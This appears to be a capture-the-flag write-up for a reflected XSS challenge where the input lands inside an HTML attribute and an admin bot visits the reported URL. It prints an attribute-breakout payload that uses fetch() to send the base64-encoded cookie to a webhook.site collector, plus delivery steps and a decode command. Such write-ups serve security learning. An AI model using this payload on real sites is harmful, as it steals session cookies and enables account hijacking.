# WS_3.02 — XSS Simple 2

---

## Problem description

The same admin-bot setup as the previous challenge, but the injection point sits **inside an HTML attribute** rather than in free HTML. The payload must first break out of the attribute before it can inject a `<script>` element.

---

## Analysis

When input is reflected inside a tag attribute (e.g. `<input value="<here>">`), a leading `">` closes the attribute and the opening tag, after which arbitrary markup can be injected:

```html
"><script>fetch('https://webhook.site/<your_id>?c=' + btoa(document.cookie))</script>
```

* `">` escapes the attribute context and the surrounding tag.
* The injected `<script>` exfiltrates the cookie to the collector.
* `btoa(...)` base64-encodes the cookie so special characters survive transport in the query string without breaking the URL.

---

## Exploit, step by step

1. Grab a collector URL from [webhook.site](https://webhook.site/).
2. Build the attribute-breakout payload above with your webhook id.
3. Deliver it through the URL and submit that URL via the report-to-admin form.
4. The admin bot executes the payload; the base64-encoded cookie arrives as the `c` parameter on the webhook.
5. Decode it from the terminal:

   ```bash
   echo "<value_of_c>" | base64 -d
   ```

The decoded cookie / value contains the flag (or is used for session hijacking as in WS_3.01).

---

## Flag

```
CCIT{****************}
```

---

## What I learned

* Reflection context dictates the payload: inside an attribute you need a breakout sequence (`">`) before any tag injection works.
* Base64-encoding exfiltrated data with `btoa` keeps cookies and other special-character payloads intact across the URL query string.
* Decoding is a one-liner with `base64 -d`, closing the loop from injection to readable data.